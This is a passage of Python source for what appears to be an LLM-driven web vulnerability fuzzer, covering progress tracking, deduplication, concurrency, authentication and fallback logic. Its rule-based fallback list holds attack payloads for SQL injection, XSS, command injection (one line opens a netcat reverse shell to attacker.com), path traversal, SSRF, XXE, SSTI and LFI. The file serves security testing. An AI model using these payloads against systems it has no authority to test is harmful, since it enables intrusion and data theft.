    def update_iteration(self, iteration: int):
        """Update the current iteration counter."""
        self.current_iteration = iteration
        self.last_activity_time = time.time()
    
    def add_finding(self):
        """Increment findings count."""
        self.findings_count += 1
    
    def add_request(self):
        """Increment request count."""
        self.requests_made += 1
    
    def add_endpoint(self, count: int = 1):
        """Increment endpoints discovered."""
        self.endpoints_discovered += count
    
    def add_technique(self, technique: str):
        """Track a technique as tested."""
        self.techniques_tested.add(technique)
    
    def add_error(self, error: str):
        """Log an error."""
        self.errors.append(error)
        self._log_activity(f"Error: {error[:100]}")
    
    def add_warning(self, warning: str):
        """Log a warning."""
        self.warnings.append(warning)
    
    def mark_scan_complete(self):
        """Mark scan as complete - sets all pending/skipped phases as complete for 100% progress."""
        for phase in self.phases.values():
            if phase.status in ("pending", "not-started", "skipped"):
                phase.status = "completed"
                phase.current_step = phase.total_steps
                phase.end_time = time.time()
        # Ensure iterations show complete
        self.current_iteration = self.max_iterations
        self._log_activity("Scan completed - all phases finalized")
    
    def _log_activity(self, message: str):
        """Add to activity log (keep last 50 entries)."""
        self.activity_log.append({
            "timestamp": datetime.utcnow().isoformat(),
            "message": message,
        })
        if len(self.activity_log) > 50:
            self.activity_log.pop(0)
    
    def get_overall_progress(self) -> float:
        """Calculate overall progress percentage (0-100)."""
        # Weight phases by their importance
        completed_weight = 0
        for phase in self.phases.values():
            if phase.status == "completed":
                # Find this phase's weight
                for name, _, weight in self.PHASES:
                    if name == phase.name:
                        completed_weight += weight
                        break
                else:
                    completed_weight += 1  # Dynamic phase
            elif phase.status == "in_progress":
                # Partial credit for in-progress phases
                for name, _, weight in self.PHASES:
                    if name == phase.name:
                        phase_progress = phase.current_step / max(phase.total_steps, 1)
                        completed_weight += weight * phase_progress
                        break
        
        # Also factor in iterations for fuzzing phase
        if self.max_iterations > 0:
            iteration_progress = (self.current_iteration / self.max_iterations) * 0.5  # 50% weight
            phase_progress = (completed_weight / max(self.total_weight, 1)) * 0.5  # 50% weight
            return min((iteration_progress + phase_progress) * 100, 100)
        
        return min((completed_weight / max(self.total_weight, 1)) * 100, 100)
    
    def get_time_elapsed(self) -> float:
        """Get time elapsed in seconds."""
        return time.time() - self.start_time
    
    def get_estimated_time_remaining(self) -> float:
        """Estimate time remaining based on current progress."""
        progress = self.get_overall_progress()
        if progress < 5:
            return -1  # Not enough data
        
        elapsed = self.get_time_elapsed()
        estimated_total = (elapsed / progress) * 100
        remaining = estimated_total - elapsed
        return max(remaining, 0)
    
    def get_current_phase_name(self) -> str:
        """Get the name of the current phase."""
        for phase in self.phases.values():
            if phase.status == "in_progress":
                return phase.name
        return "idle"
    
    def get_status_summary(self) -> Dict[str, Any]:
        """Get comprehensive status summary for frontend display."""
        elapsed = self.get_time_elapsed()
        remaining = self.get_estimated_time_remaining()
        overall_progress = self.get_overall_progress()
        current_phase = self.get_current_phase_name()
        
        # Get current phase details
        current_phase_data = None
        if current_phase in self.phases:
            current_phase_data = self.phases[current_phase].to_dict()
        
        # Build phase timeline
        phase_timeline = []
        for name, desc, _ in self.PHASES:
            if name in self.phases:
                phase = self.phases[name]
                phase_timeline.append({
                    "name": name,
                    "label": desc,
                    "status": phase.status,
                    "progress": round((phase.current_step / max(phase.total_steps, 1)) * 100, 1),
                })
        
        return {
            "scan_id": self.scan_id,
            "status": "running" if any(p.status == "in_progress" for p in self.phases.values()) else "idle",
            "overall_progress": round(overall_progress, 1),
            "current_phase": current_phase,
            "current_phase_details": current_phase_data,
            "iteration": self.current_iteration,
            "max_iterations": self.max_iterations,
            "time_elapsed_seconds": round(elapsed, 1),
            "time_remaining_seconds": round(remaining, 1) if remaining >= 0 else None,
            "estimated_completion": (
                datetime.utcnow().isoformat() if remaining < 0 
                else (datetime.utcnow().replace(microsecond=0) + 
                      __import__('datetime').timedelta(seconds=remaining)).isoformat()
            ) if remaining >= 0 else None,
            "metrics": {
                "requests_made": self.requests_made,
                "findings_count": self.findings_count,
                "endpoints_discovered": self.endpoints_discovered,
                "techniques_tested": len(self.techniques_tested),
            },
            "phase_timeline": phase_timeline,
            "recent_activity": self.activity_log[-10:],  # Last 10 activities
            "errors_count": len(self.errors),
            "warnings_count": len(self.warnings),
        }
    
    def get_progress_event(self) -> Dict[str, Any]:
        """Generate a progress event for SSE streaming."""
        summary = self.get_status_summary()
        return {
            "type": "progress_update",
            **summary,
        }


# Global progress trackers per scan
_progress_trackers: Dict[str, ScanProgressTracker] = {}


def get_progress_tracker(scan_id: str, max_iterations: int = 50) -> ScanProgressTracker:
    """Get or create a progress tracker for a scan."""
    if scan_id not in _progress_trackers:
        _progress_trackers[scan_id] = ScanProgressTracker(scan_id, max_iterations)
    return _progress_trackers[scan_id]


def cleanup_progress_tracker(scan_id: str):
    """Clean up a progress tracker when scan completes."""
    if scan_id in _progress_trackers:
        del _progress_trackers[scan_id]


# =============================================================================
# REQUEST DEDUPLICATION (for HTTP calls)
# =============================================================================

class RequestDeduplicator:
    """Tracks and deduplicates HTTP requests to avoid redundant calls."""
    
    def __init__(self, max_cache_size: int = 5000, ttl_seconds: float = 300.0):
        self._seen_requests: Dict[str, float] = {}  # hash -> timestamp
        self._max_cache_size = max_cache_size
        self._ttl_seconds = ttl_seconds
        self._hits = 0
        self._misses = 0
    
    def _generate_request_hash(
        self, 
        url: str, 
        method: str, 
        payload: str, 
        position: str
    ) -> str:
        """Generate a hash for a request."""
        signature = f"{method}:{url}:{position}:{payload[:500] if payload else ''}"
        return hashlib.md5(signature.encode()).hexdigest()
    
    def _cleanup_expired(self):
        """Remove expired entries."""
        now = time.time()
        expired = [k for k, v in self._seen_requests.items() if now - v > self._ttl_seconds]
        for key in expired:
            del self._seen_requests[key]
        
        # Also enforce max size by removing oldest entries
        if len(self._seen_requests) > self._max_cache_size:
            sorted_entries = sorted(self._seen_requests.items(), key=lambda x: x[1])
            to_remove = len(self._seen_requests) - self._max_cache_size
            for key, _ in sorted_entries[:to_remove]:
                del self._seen_requests[key]
    
    def is_duplicate(
        self, 
        url: str, 
        method: str, 
        payload: str, 
        position: str
    ) -> Tuple[bool, str]:
        """Check if this request has been made recently."""
        self._cleanup_expired()
        
        req_hash = self._generate_request_hash(url, method, payload, position)
        
        if req_hash in self._seen_requests:
            self._hits += 1
            return True, "Request already made recently"
        
        self._misses += 1
        self._seen_requests[req_hash] = time.time()
        return False, ""
    
    def mark_as_sent(self, url: str, method: str, payload: str, position: str):
        """Explicitly mark a request as sent."""
        req_hash = self._generate_request_hash(url, method, payload, position)
        self._seen_requests[req_hash] = time.time()
    
    def get_stats(self) -> Dict[str, Any]:
        """Get deduplication statistics."""
        return {
            "cache_size": len(self._seen_requests),
            "max_cache_size": self._max_cache_size,
            "hits": self._hits,
            "misses": self._misses,
            "hit_rate": self._hits / (self._hits + self._misses) if (self._hits + self._misses) > 0 else 0,
        }
    
    def clear(self):
        """Clear the cache."""
        self._seen_requests.clear()
        self._hits = 0
        self._misses = 0


# Global request deduplicator
_request_deduplicator = RequestDeduplicator(max_cache_size=5000, ttl_seconds=300.0)


# =============================================================================
# FINDING DEDUPLICATION
# =============================================================================

class FindingDeduplicator:
    """Deduplicate findings using similarity hashing."""
    
    def __init__(self, similarity_threshold: float = 0.85):
        self.similarity_threshold = similarity_threshold
        self._finding_hashes: Dict[str, Set[str]] = {}  # endpoint -> set of hashes
        self._finding_signatures: List[Dict[str, Any]] = []
    
    def _generate_finding_hash(self, finding: 'FuzzingFinding') -> str:
        """Generate a hash for a finding based on key characteristics."""
        # Create a signature from the finding's key attributes
        signature = f"{finding.technique}:{finding.endpoint}:{finding.parameter or ''}:{finding.cwe_id or ''}"
        return hashlib.md5(signature.encode()).hexdigest()
    
    def _generate_similarity_hash(self, finding: 'FuzzingFinding') -> str:
        """Generate a hash for similarity comparison."""
        # Normalize the title and description for comparison
        normalized_title = re.sub(r'\s+', ' ', finding.title.lower().strip())
        normalized_desc = re.sub(r'\s+', ' ', finding.description.lower().strip()[:200])
        
        signature = f"{finding.technique}:{finding.severity}:{normalized_title}:{normalized_desc}"
        return hashlib.md5(signature.encode()).hexdigest()
    
    def _calculate_similarity(self, finding1: 'FuzzingFinding', finding2: Dict[str, Any]) -> float:
        """Calculate similarity between two findings."""
        score = 0.0
        weights = {
            "technique": 0.3,
            "endpoint": 0.25,
            "parameter": 0.15,
            "severity": 0.15,
            "cwe_id": 0.15,
        }
        
        # Technique match
        if finding1.technique == finding2.get("technique"):
            score += weights["technique"]
        
        # Endpoint match (check if same path, ignoring query params)
        url1 = urllib.parse.urlparse(finding1.endpoint).path
        url2 = urllib.parse.urlparse(finding2.get("endpoint", "")).path
        if url1 == url2:
            score += weights["endpoint"]
        
        # Parameter match
        if finding1.parameter == finding2.get("parameter"):
            score += weights["parameter"]
        elif finding1.parameter and finding2.get("parameter"):
            # Partial match if parameters are similar
            if finding1.parameter in finding2.get("parameter", "") or finding2.get("parameter", "") in finding1.parameter:
                score += weights["parameter"] * 0.5
        
        # Severity match
        if finding1.severity == finding2.get("severity"):
            score += weights["severity"]
        
        # CWE match
        if finding1.cwe_id and finding1.cwe_id == finding2.get("cwe_id"):
            score += weights["cwe_id"]
        
        return score
    
    def is_duplicate(self, finding: 'FuzzingFinding') -> Tuple[bool, Optional[str]]:
        """Check if a finding is a duplicate of an existing one."""
        finding_hash = self._generate_finding_hash(finding)
        similarity_hash = self._generate_similarity_hash(finding)
        
        # Check exact hash match
        endpoint_hashes = self._finding_hashes.get(finding.endpoint, set())
        if finding_hash in endpoint_hashes:
            return True, "exact_match"
        
        # Check similarity against all stored findings
        for stored in self._finding_signatures:
            if stored["similarity_hash"] == similarity_hash:
                return True, "similarity_hash_match"
            
            # Calculate similarity score
            similarity = self._calculate_similarity(finding, stored)
            if similarity >= self.similarity_threshold:
                return True, f"similarity_score_{similarity:.2f}"
        
        return False, None
    
    def add_finding(self, finding: 'FuzzingFinding'):
        """Add a finding to the deduplication index."""
        finding_hash = self._generate_finding_hash(finding)
        similarity_hash = self._generate_similarity_hash(finding)
        
        # Add to hash sets
        if finding.endpoint not in self._finding_hashes:
            self._finding_hashes[finding.endpoint] = set()
        self._finding_hashes[finding.endpoint].add(finding_hash)
        
        # Store signature for similarity comparison
        self._finding_signatures.append({
            "id": finding.id,
            "technique": finding.technique,
            "endpoint": finding.endpoint,
            "parameter": finding.parameter,
            "severity": finding.severity,
            "cwe_id": finding.cwe_id,
            "finding_hash": finding_hash,
            "similarity_hash": similarity_hash,
        })
    
    def get_stats(self) -> Dict[str, Any]:
        """Get deduplication statistics."""
        return {
            "endpoints_tracked": len(self._finding_hashes),
            "unique_findings": len(self._finding_signatures),
            "total_hashes": sum(len(h) for h in self._finding_hashes.values()),
        }
    
    def clear(self):
        """Clear the deduplication index."""
        self._finding_hashes.clear()
        self._finding_signatures.clear()


# Global deduplicator instance
_finding_deduplicator = FindingDeduplicator(similarity_threshold=0.85)


# =============================================================================
# PARALLEL TESTING WITH CONCURRENCY CONTROL
# =============================================================================

@dataclass
class ConcurrencyConfig:
    """Configuration for parallel testing."""
    max_workers: int = 5
    batch_size: int = 10
    batch_delay: float = 0.5  # Delay between batches
    respect_rate_limit: bool = True


class ParallelExecutor:
    """Execute fuzzing requests in parallel with concurrency control."""
    
    def __init__(self, config: ConcurrencyConfig = None):
        self.config = config or ConcurrencyConfig()
        self._semaphore = asyncio.Semaphore(self.config.max_workers)
        self._active_tasks: int = 0
        self._completed_tasks: int = 0
        self._failed_tasks: int = 0
    
    async def _execute_with_semaphore(
        self,
        target: 'FuzzingTarget',
        payload: str,
        position: str = "param",
        timeout: int = 10,
    ) -> Dict[str, Any]:
        """Execute a single request with semaphore control."""
        async with self._semaphore:
            self._active_tasks += 1
            try:
                result = await execute_fuzzing_request(
                    target, payload, position, timeout,
                    use_rate_limit=self.config.respect_rate_limit
                )
                if result.get("success"):
                    self._completed_tasks += 1
                else:
                    self._failed_tasks += 1
                return result
            except Exception as e:
                self._failed_tasks += 1
                return {
                    "success": False,
                    "error": str(e),
                    "payload": payload,
                }
            finally:
                self._active_tasks -= 1
    
    async def execute_batch(
        self,
        target: 'FuzzingTarget',
        payloads: List[str],
        position: str = "param",
        timeout: int = 10,
    ) -> List[Dict[str, Any]]:
        """Execute a batch of payloads in parallel."""
        results = []
        
        # Process in batches
        for i in range(0, len(payloads), self.config.batch_size):
            batch = payloads[i:i + self.config.batch_size]
            
            # Create tasks for this batch
            tasks = [
                self._execute_with_semaphore(target, payload, position, timeout)
                for payload in batch
            ]
            
            # Execute batch concurrently
            batch_results = await asyncio.gather(*tasks, return_exceptions=True)
            
            # Process results
            for j, result in enumerate(batch_results):
                if isinstance(result, Exception):
                    results.append({
                        "success": False,
                        "error": str(result),
                        "payload": batch[j],
                    })
                else:
                    results.append(result)
            
            # Delay between batches
            if i + self.config.batch_size < len(payloads):
                await asyncio.sleep(self.config.batch_delay)
        
        return results
    
    async def execute_multi_target(
        self,
        targets_payloads: List[Tuple['FuzzingTarget', List[str]]],
        position: str = "param",
        timeout: int = 10,
    ) -> Dict[str, List[Dict[str, Any]]]:
        """Execute payloads across multiple targets in parallel."""
        all_results = {}
        
        async def process_target(target: 'FuzzingTarget', payloads: List[str]):
            results = await self.execute_batch(target, payloads, position, timeout)
            return target.url, results
        
        tasks = [
            process_target(target, payloads)
            for target, payloads in targets_payloads
        ]
        
        completed = await asyncio.gather(*tasks, return_exceptions=True)
        
        for result in completed:
            if isinstance(result, Exception):
                logger.error(f"Multi-target execution error: {result}")
            else:
                url, results = result
                all_results[url] = results
        
        return all_results
    
    def get_stats(self) -> Dict[str, Any]:
        """Get executor statistics."""
        return {
            "max_workers": self.config.max_workers,
            "batch_size": self.config.batch_size,
            "active_tasks": self._active_tasks,
            "completed_tasks": self._completed_tasks,
            "failed_tasks": self._failed_tasks,
        }
    
    def reset_stats(self):
        """Reset execution statistics."""
        self._completed_tasks = 0
        self._failed_tasks = 0


# Global parallel executor
_parallel_executor = ParallelExecutor(ConcurrencyConfig(max_workers=5, batch_size=10))


# =============================================================================
# AUTHENTICATION SUPPORT
# =============================================================================

class AuthType(str, Enum):
    """Supported authentication types."""
    NONE = "none"
    BASIC = "basic"
    BEARER = "bearer"
    API_KEY = "api_key"
    JWT = "jwt"
    OAUTH2 = "oauth2"
    SESSION = "session"
    CUSTOM = "custom"


@dataclass
class AuthConfig:
    """Authentication configuration."""
    auth_type: AuthType = AuthType.NONE
    
    # Basic Auth
    username: Optional[str] = None
    password: Optional[str] = None
    
    # Bearer / JWT / API Key
    token: Optional[str] = None
    token_header: str = "Authorization"
    token_prefix: str = "Bearer"
    
    # API Key specific
    api_key_name: str = "X-API-Key"
    api_key_location: str = "header"  # header, query, cookie
    
    # OAuth2
    oauth_token_url: Optional[str] = None
    oauth_client_id: Optional[str] = None
    oauth_client_secret: Optional[str] = None
    oauth_scope: Optional[str] = None
    
    # Session / Cookie
    session_cookie_name: str = "session"
    session_cookie_value: Optional[str] = None
    login_url: Optional[str] = None
    login_payload: Optional[Dict[str, str]] = None
    
    # Token refresh
    refresh_token: Optional[str] = None
    refresh_url: Optional[str] = None
    token_expiry: Optional[float] = None  # Unix timestamp
    auto_refresh: bool = True
    refresh_margin: float = 60.0  # Refresh this many seconds before expiry


class AuthManager:
    """Manage authentication for fuzzing requests."""
    
    def __init__(self, config: AuthConfig = None):
        self.config = config or AuthConfig()
        self._current_token: Optional[str] = None
        self._token_expiry: Optional[float] = None
        self._session_cookies: Dict[str, str] = {}
        self._refresh_lock = asyncio.Lock()
    
    async def get_auth_headers(self) -> Dict[str, str]:
        """Get authentication headers for a request."""
        headers = {}
        
        if self.config.auth_type == AuthType.NONE:
            return headers
        
        elif self.config.auth_type == AuthType.BASIC:
            if self.config.username and self.config.password:
                credentials = base64.b64encode(
                    f"{self.config.username}:{self.config.password}".encode()
                ).decode()
                headers["Authorization"] = f"Basic {credentials}"
        
        elif self.config.auth_type in (AuthType.BEARER, AuthType.JWT):
            token = await self._get_valid_token()
            if token:
                headers[self.config.token_header] = f"{self.config.token_prefix} {token}"
        
        elif self.config.auth_type == AuthType.API_KEY:
            if self.config.token and self.config.api_key_location == "header":
                headers[self.config.api_key_name] = self.config.token
        
        elif self.config.auth_type == AuthType.OAUTH2:
            token = await self._get_oauth_token()
            if token:
                headers["Authorization"] = f"Bearer {token}"
        
        return headers
    
    def get_auth_params(self) -> Dict[str, str]:
        """Get authentication query parameters."""
        params = {}
        
        if self.config.auth_type == AuthType.API_KEY:
            if self.config.token and self.config.api_key_location == "query":
                params[self.config.api_key_name] = self.config.token
        
        return params
    
    def get_auth_cookies(self) -> Dict[str, str]:
        """Get authentication cookies."""
        cookies = dict(self._session_cookies)
        
        if self.config.auth_type == AuthType.SESSION:
            if self.config.session_cookie_value:
                cookies[self.config.session_cookie_name] = self.config.session_cookie_value
        
        elif self.config.auth_type == AuthType.API_KEY:
            if self.config.token and self.config.api_key_location == "cookie":
                cookies[self.config.api_key_name] = self.config.token
        
        return cookies
    
    async def _get_valid_token(self) -> Optional[str]:
        """Get a valid token, refreshing if necessary."""
        # Check if current token is valid
        if self._current_token:
            if self._token_expiry is None or time.time() < self._token_expiry - self.config.refresh_margin:
                return self._current_token
        
        # Use configured token if available
        if self.config.token:
            self._current_token = self.config.token
            self._token_expiry = self.config.token_expiry
            return self._current_token
        
        # Try to refresh token
        if self.config.auto_refresh and self.config.refresh_token and self.config.refresh_url:
            await self._refresh_token()
        
        return self._current_token
    
    async def _refresh_token(self):
        """Refresh the authentication token."""
        async with self._refresh_lock:
            # Double-check after acquiring lock
            if self._token_expiry and time.time() < self._token_expiry - self.config.refresh_margin:
                return
            
            try:
                async with httpx.AsyncClient(timeout=30) as client:
                    response = await client.post(
                        self.config.refresh_url,
                        data={"refresh_token": self.config.refresh_token},
                    )
                    
                    if response.status_code == 200:
                        data = response.json()
                        self._current_token = data.get("access_token")
                        
                        # Calculate expiry
                        expires_in = data.get("expires_in", 3600)
                        self._token_expiry = time.time() + expires_in
                        
                        # Update refresh token if provided
                        if "refresh_token" in data:
                            self.config.refresh_token = data["refresh_token"]
                        
                        logger.info("Token refreshed successfully")
                    else:
                        logger.error(f"Token refresh failed: {response.status_code}")
                        
            except Exception as e:
                logger.error(f"Token refresh error: {e}")
    
    async def _get_oauth_token(self) -> Optional[str]:
        """Get OAuth2 token using client credentials."""
        if self._current_token and self._token_expiry and time.time() < self._token_expiry - self.config.refresh_margin:
            return self._current_token
        
        if not all([self.config.oauth_token_url, self.config.oauth_client_id, self.config.oauth_client_secret]):
            return self.config.token
        
        try:
            async with httpx.AsyncClient(timeout=30) as client:
                response = await client.post(
                    self.config.oauth_token_url,
                    data={
                        "grant_type": "client_credentials",
                        "client_id": self.config.oauth_client_id,
                        "client_secret": self.config.oauth_client_secret,
                        "scope": self.config.oauth_scope or "",
                    },
                )
                
                if response.status_code == 200:
                    data = response.json()
                    self._current_token = data.get("access_token")
                    expires_in = data.get("expires_in", 3600)
                    self._token_expiry = time.time() + expires_in
                    return self._current_token
                    
        except Exception as e:
            logger.error(f"OAuth token error: {e}")
        
        return None
    
    async def login(self) -> bool:
        """Perform login to establish session."""
        if not self.config.login_url or not self.config.login_payload:
            return False
        
        try:
            async with httpx.AsyncClient(timeout=30) as client:
                response = await client.post(
                    self.config.login_url,
                    data=self.config.login_payload,
                    follow_redirects=True,
                )
                
                if response.status_code in (200, 302):
                    # Extract session cookies
                    for cookie in response.cookies.jar:
                        self._session_cookies[cookie.name] = cookie.value
                    
                    logger.info("Login successful")
                    return True
                else:
                    logger.error(f"Login failed: {response.status_code}")
                    
        except Exception as e:
            logger.error(f"Login error: {e}")
        
        return False
    
    def set_token(self, token: str, expiry: Optional[float] = None):
        """Manually set the authentication token."""
        self._current_token = token
        self._token_expiry = expiry
    
    def clear_session(self):
        """Clear authentication state."""
        self._current_token = None
        self._token_expiry = None
        self._session_cookies.clear()
    
    def get_status(self) -> Dict[str, Any]:
        """Get authentication status."""
        return {
            "auth_type": self.config.auth_type.value,
            "has_token": bool(self._current_token),
            "token_valid": self._token_expiry is None or time.time() < self._token_expiry,
            "token_expiry": self._token_expiry,
            "session_cookies": len(self._session_cookies),
            "auto_refresh": self.config.auto_refresh,
        }


# Global auth manager (can be configured per session)
_auth_manager = AuthManager()


# =============================================================================
# GRACEFUL DEGRADATION & FALLBACK MODES
# =============================================================================

class DegradationLevel(str, Enum):
    """System degradation levels."""
    NORMAL = "normal"           # Full LLM-driven fuzzing
    REDUCED = "reduced"         # LLM with simpler prompts
    RULE_BASED = "rule_based"   # No LLM, rule-based only
    MINIMAL = "minimal"         # Basic probing only
    EMERGENCY = "emergency"     # Just connectivity checks


@dataclass
class TimeoutConfig:
    """Multi-tier timeout configuration."""
    soft_timeout: float = 10.0      # Warn and continue
    hard_timeout: float = 30.0      # Cancel operation
    global_timeout: float = 300.0   # Cancel entire session
    llm_timeout: float = 60.0       # LLM-specific timeout
    connection_timeout: float = 5.0  # Initial connection


@dataclass
class FallbackResult:
    """Result from a fallback operation."""
    success: bool
    data: Any
    source: str  # "llm", "rule_based", "cache", "default"
    degraded: bool = False
    error: Optional[str] = None


class GracefulDegradation:
    """Manages graceful degradation and fallback modes."""
    
    def __init__(self):
        self.current_level = DegradationLevel.NORMAL
        self.timeout_config = TimeoutConfig()
        self._level_history: List[Tuple[float, DegradationLevel]] = []
        self._consecutive_failures: int = 0
        self._last_success_time: float = time.time()
        self._partial_results: Dict[str, Any] = {}
        self._rule_based_cache: Dict[str, List[str]] = {}  # technique -> payloads
        
        # Initialize rule-based payload cache
        self._init_rule_based_payloads()
    
    def _init_rule_based_payloads(self):
        """Initialize rule-based fuzzing payloads for fallback."""
        self._rule_based_cache = {
            "sqli": [
                "' OR '1'='1", "' OR 1=1--", "'; DROP TABLE users--",
                "1' AND '1'='1", "admin'--", "' UNION SELECT NULL--",
                "1; SELECT * FROM users", "' OR ''='", "-1' OR 1=1#",
            ],
            "xss": [
                "<script>alert(1)</script>", "javascript:alert(1)",
                "<img src=x onerror=alert(1)>", "<svg onload=alert(1)>",
                "'-alert(1)-'", "\"><script>alert(1)</script>",
                "<body onload=alert(1)>", "{{constructor.constructor('alert(1)')()}}",
            ],
            "command_injection": [
                "; ls -la", "| cat /etc/passwd", "&& whoami",
                "`id`", "$(whoami)", "; ping -c 4 127.0.0.1",
                "| nc -e /bin/sh attacker.com 4444", "%0aid",
            ],
            "path_traversal": [
                "../../../etc/passwd", "....//....//etc/passwd",
                "..\\..\\..\\windows\\system32\\config\\sam",
                "%2e%2e%2f%2e%2e%2fetc/passwd", r"....\/....\/etc/passwd",
            ],
            "ssrf": [
                "http://localhost", "http://127.0.0.1",
                "http://[::1]", "http://169.254.169.254/latest/meta-data/",
                "file:///etc/passwd", "dict://localhost:11211/",
            ],
            "xxe": [
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]><foo>&xxe;</foo>',
            ],
            "ssti": [
                "{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}",
                "{{config}}", "{{self.__class__.__mro__}}",
            ],
            "lfi": [
                "php://filter/convert.base64-encode/resource=index.php",
                "expect://id", "data://text/plain,<?php system('id');?>",
            ],
        }
    
    def should_degrade(self, error_count: int = None) -> bool:
        """Check if system should degrade to a lower level."""
        if error_count is not None:
            self._consecutive_failures = error_count
        
        thresholds = {
            DegradationLevel.NORMAL: 3,
            DegradationLevel.REDUCED: 5,
            DegradationLevel.RULE_BASED: 8,
            DegradationLevel.MINIMAL: 12,
        }
        
        current_threshold = thresholds.get(self.current_level, 3)
        return self._consecutive_failures >= current_threshold
    
    def degrade(self) -> DegradationLevel:
        """Move to a lower degradation level."""
        levels = list(DegradationLevel)
        current_idx = levels.index(self.current_level)
        
        if current_idx < len(levels) - 1:
            self.current_level = levels[current_idx + 1]
            self._level_history.append((time.time(), self.current_level))
            logger.warning(f"System degraded to: {self.current_level.value}")
        
        return self.current_level
    
    def recover(self) -> DegradationLevel:
        """Attempt to recover to a higher level."""
        levels = list(DegradationLevel)
        current_idx = levels.index(self.current_level)
        
        if current_idx > 0:
            self.current_level = levels[current_idx - 1]
            self._consecutive_failures = 0
            self._level_history.append((time.time(), self.current_level))
            logger.info(f"System recovered to: {self.current_level.value}")
        
        return self.current_level
    
    def record_success(self):
        """Record a successful operation."""
        self._consecutive_failures = 0
        self._last_success_time = time.time()
        
        # Consider recovery after sustained success
        if time.time() - self._last_success_time > 60:  # 60 seconds of success
            self.recover()
    
    def record_failure(self):
        """Record a failed operation."""
        self._consecutive_failures += 1
        
        if self.should_degrade():
            self.degrade()
    
    def get_rule_based_payloads(self, technique: str) -> List[str]:
        """Get rule-based payloads for a technique."""
        return self._rule_based_cache.get(technique.lower(), [])
    
    def store_partial_result(self, key: str, data: Any):
        """Store partial results for later use."""
        self._partial_results[key] = {
            "data": data,
            "timestamp": time.time(),
        }
    
    def get_partial_results(self) -> Dict[str, Any]:
        """Get all stored partial results."""
        return {k: v["data"] for k, v in self._partial_results.items()}
    
    async def execute_with_fallback(
        self,
        primary_func,
        fallback_func,
        *args,
        timeout: float = None,
        **kwargs
    ) -> FallbackResult:
        """Execute with automatic fallback on failure."""
        timeout = timeout or self.timeout_config.hard_timeout
        
        # Try primary function
        try:
            result = await asyncio.wait_for(
                primary_func(*args, **kwargs),
                timeout=timeout
            )
            self.record_success()
            return FallbackResult(success=True, data=result, source="primary")
            
        except asyncio.TimeoutError:
            logger.warning(f"Primary function timed out after {timeout}s, using fallback")
            self.record_failure()
            
        except Exception as e:
            logger.warning(f"Primary function failed: {e}, using fallback")
            self.record_failure()
        
        # Try fallback function
        try:
            result = await fallback_func(*args, **kwargs)
            return FallbackResult(
                success=True, 
                data=result, 
                source="fallback",
                degraded=True
            )
        except Exception as e:
            return FallbackResult(
                success=False,
                data=None,
                source="none",
                degraded=True,
                error=str(e)
            )
    
    def get_status(self) -> Dict[str, Any]:
        """Get degradation status."""
        return {
            "current_level": self.current_level.value,
            "consecutive_failures": self._consecutive_failures,
            "last_success": self._last_success_time,
            "partial_results_count": len(self._partial_results),
            "level_history": [
                {"time": t, "level": l.value} 
                for t, l in self._level_history[-10:]
            ],
        }


# =============================================================================
# INTELLIGENT ERROR CLASSIFICATION & RECOVERY
# =============================================================================

class ErrorCategory(str, Enum):
    """Categories of errors for intelligent handling."""
    TRANSIENT = "transient"       # Temporary, should retry
    RATE_LIMIT = "rate_limit"     # Being rate limited
    AUTH = "auth"                 # Authentication issue
    NETWORK = "network"           # Network connectivity
    TIMEOUT = "timeout"           # Operation timed out
    SERVER = "server"             # Server-side error
    CLIENT = "client"             # Client-side error
    PERMANENT = "permanent"       # Won't recover with retry
    UNKNOWN = "unknown"           # Unclassified


class ErrorSeverity(str, Enum):
    """Severity levels for errors."""
    LOW = "low"           # Can ignore
    MEDIUM = "medium"     # Should handle
    HIGH = "high"         # Must handle
    CRITICAL = "critical" # Stop operation


@dataclass
class ClassifiedError:
    """A classified error with recovery strategy."""
    original_error: Exception
    category: ErrorCategory
    severity: ErrorSeverity
    recoverable: bool
    retry_after: float = 0.0      # Suggested wait time
    skip_endpoint: bool = False    # Should skip this endpoint
    message: str = ""
    context: Dict[str, Any] = field(default_factory=dict)


@dataclass
class DeadLetterItem:
    """An item in the dead letter queue."""
    id: str
    operation: str
    target: str
    payload: str
    error: ClassifiedError
    attempts: int
    created_at: float
    last_attempt: float
    next_retry: float


class ErrorClassifier:
    """Classify and handle errors intelligently."""
    
    # Error patterns for classification
    TRANSIENT_PATTERNS = [
        r"connection reset",
        r"temporary failure",
        r"try again",
        r"service unavailable",
        r"overloaded",
    ]
    
    RATE_LIMIT_PATTERNS = [
        r"rate limit",
        r"too many requests",
        r"throttl",
        r"quota exceeded",
        r"slow down",
    ]
    
    AUTH_PATTERNS = [
        r"unauthorized",
        r"authentication",
        r"invalid token",
        r"expired",
        r"forbidden",
        r"access denied",
    ]
    
    PERMANENT_PATTERNS = [
        r"not found",
        r"invalid endpoint",
        r"method not allowed",
        r"gone",
        r"invalid request",
    ]
    
    def __init__(self):
        self._error_history: List[ClassifiedError] = []
        self._endpoint_failures: Dict[str, int] = {}  # endpoint -> failure count
        self._auto_skip_threshold: int = 5
    
    def classify(
        self, 
        error: Exception,
        status_code: int = None,
        response_body: str = None,
        endpoint: str = None
    ) -> ClassifiedError:
        """Classify an error and determine recovery strategy."""
        error_str = str(error).lower()
        response_body = (response_body or "").lower()
        
        # Check status code first
        if status_code:
            classified = self._classify_by_status(status_code, error)
            if classified:
                return self._finalize_classification(classified, endpoint)
        
        # Check error patterns
        classified = self._classify_by_pattern(error_str, response_body, error)
        return self._finalize_classification(classified, endpoint)
    
    def _classify_by_status(self, status_code: int, error: Exception) -> Optional[ClassifiedError]:
        """Classify based on HTTP status code."""
        if status_code == 429:
            return ClassifiedError(
                original_error=error,
                category=ErrorCategory.RATE_LIMIT,
                severity=ErrorSeverity.MEDIUM,
                recoverable=True,
                retry_after=30.0,
                message="Rate limited - backing off",
            )
        
        elif status_code in (401, 403):
            return ClassifiedError(
                original_error=error,
                category=ErrorCategory.AUTH,
                severity=ErrorSeverity.HIGH,
                recoverable=False,
                skip_endpoint=True,
                message="Authentication/authorization failure",
            )
        
        elif status_code == 404:
            return ClassifiedError(
                original_error=error,
                category=ErrorCategory.PERMANENT,
                severity=ErrorSeverity.LOW,
                recoverable=False,
                skip_endpoint=True,
                message="Endpoint not found",
            )
        
        elif status_code in (500, 502, 503, 504):
            return ClassifiedError(
                original_error=error,
                category=ErrorCategory.SERVER,
                severity=ErrorSeverity.MEDIUM,
